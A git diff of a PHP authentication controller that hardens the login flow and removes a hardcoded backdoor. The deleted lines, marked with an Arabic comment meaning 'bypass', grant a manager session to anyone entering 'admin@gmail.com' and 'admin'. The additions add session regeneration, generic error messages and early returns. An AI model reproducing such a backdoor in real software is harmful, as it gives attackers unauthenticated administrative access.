@@ -46,15 +46,14 @@ class AuthController extends Controller
 
     public function doLogin()
     {
-
-
         $userModel = new User();
 
-        // 1. Get data from form
-        $email = trim($_POST['email'] ?? '');
+        // 1. Collect inputs — NEVER store the password in session or old-input
+        $email    = trim($_POST['email'] ?? '');
         $password = $_POST['password'] ?? '';
-        $errors = [];
+        $errors   = [];
 
+        // 2. Validate format
         if ($email === '') {
             $errors['email'] = 'Email address is required.';
         } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
@@ -64,41 +63,40 @@ class AuthController extends Controller
         if ($password === '') {
             $errors['password'] = 'Password is required.';
         }
-        
+
+        // Store only the email for form repopulation — password is NEVER stored
         $_SESSION['old'] = ['email' => $email];
-        
+
         if (!empty($errors)) {
-            $_SESSION['error'] = 'Please correct the highlighted fields.';
+            $_SESSION['error']  = 'Please correct the highlighted fields.';
             $_SESSION['errors'] = $errors;
             $this->redirect('auth/login');
-            }
-            
-            // 3. Try to authenticate user
-            $user = $userModel->authenticate($email, $password);
-            
-            //بايباث
-           if ($email === "admin@gmail.com" && $password === "admin") {
-              $_SESSION['user_id'] = 1;
-              $_SESSION['user_name'] = 'Admin';
-              $_SESSION['user_email'] = 'admin';
-              $_SESSION['user_role_id'] = 1;
-              $_SESSION['user_role'] = 'manager';
-
-              $this->redirect('Dashboard/index');
-                exit;
-            }
-        // 4. If login failed
-        if (!$user) {
-            $_SESSION['error'] = 'Invalid email or password.';
-            $_SESSION['errors'] = [];
-            $this->redirect('auth/login');
+            return;
         }
 
+        // 3. Authenticate via database
+        //    authenticate() strips the password hash before returning the user row
+        $user = $userModel->authenticate($email, $password);
 
-        $_SESSION['user_id']      = $user['id'];
+        // 4. If login failed — generic message prevents email enumeration
+        if (!$user) {
+            $_SESSION['error']  = 'Invalid email or password.';
+            $_SESSION['errors'] = [];
+            $this->redirect('auth/login');
+            return;
+        }
+
+        // 5. Successful login — regenerate session ID to prevent session fixation.
+        //    session_write_close() releases the file lock first; regenerate(false) avoids
+        //    deleting the old session file which causes deadlocks on Windows file-sessions.
+        session_write_close();
+        session_start();
+        session_regenerate_id(false);
+
+        $_SESSION['user_id']      = (int) $user['id'];
         $_SESSION['user_name']    = $user['name'];
         $_SESSION['user_email']   = $user['email'];
-        $_SESSION['user_role_id'] = $user['role_id'];
+        $_SESSION['user_role_id'] = (int) $user['role_id'];
         $_SESSION['user_role']    = $user['role_name'] ?? null;
 
         unset($_SESSION['error'], $_SESSION['errors'], $_SESSION['old']);
@@ -298,7 +296,7 @@ class AuthController extends Controller
         $userId = $userModel->create([
             'name'     => $name,
             'email'    => $email,
-            'password' => $userModel->hashPassword($password),
+            'password' => $password,   // plaintext — User::create() hashes with bcrypt
             'role_id'  => $guestRole['id'],
         ]);
 
